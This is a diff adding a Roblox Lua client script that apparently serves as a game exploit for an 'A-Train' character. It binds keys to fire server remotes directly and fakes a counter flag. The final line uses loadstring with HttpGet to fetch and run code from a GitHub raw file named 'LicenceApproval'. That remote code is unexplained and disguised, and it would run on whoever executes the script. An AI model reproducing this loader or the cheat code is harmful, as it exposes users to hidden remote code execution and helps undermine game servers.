@@ -1,0 +1,53 @@
+game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
+    if gameProcessedEvent then
+        return 
+    end
+   local plrs = game:GetService("Players")
+   local plr = plrs.LocalPlayer
+   local char = plr.Character
+   local Humanoid = char:WaitForChild("Humanoid")
+   local Animator = Humanoid:WaitForChild("Animator")
+   local ATrain = char:GetChildren()[27]
+   local Anims = ATrain.Animations
+
+local function counter()
+local Tealc = Instance.new("BoolValue", char)
+Tealc.Name = "CounterSucces"
+task.wait(0.1)
+Tealc:Destroy()
+
+
+end
+
+
+local HideNSeekVar = game:GetService("ReplicatedStorage").Characters["A-Train"].Remotes.BehindYou
+local GrabVar = game:GetService("ReplicatedStorage").Characters["A-Train"].Remotes.Grab
+local BlockVar = game:GetService("ReplicatedStorage").Characters["Combat"].Remotes.Blocking
+local FinisherVar = game:GetService("ReplicatedStorage").Characters["A-Train"].Remotes.Finisher
+
+   local Move1Anim = Animator:LoadAnimation(Anims.BellyPunch)
+      local Move4Anim = Animator:LoadAnimation(Anims.GrabStart)
+  local MoveEAnim = Animator:LoadAnimation(Anims.AdShot)
+  local BlockAnim = Animator:LoadAnimation(Anims.Blocking)
+
+
+
+    if input.KeyCode == Enum.KeyCode.One then
+Move1Anim:Play()
+HideNSeekVar:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.Three then
+task.spawn(counter)
+elseif input.KeyCode == Enum.KeyCode.Four then
+   Move4Anim:Play()
+GrabVar:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.Five then
+FinisherVar:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.F then
+BlockAnim:Play()
+BlockVar:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.E then
+MoveEAnim:Play()
+   ATrain.Inject:FireServer(plr)
+   end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
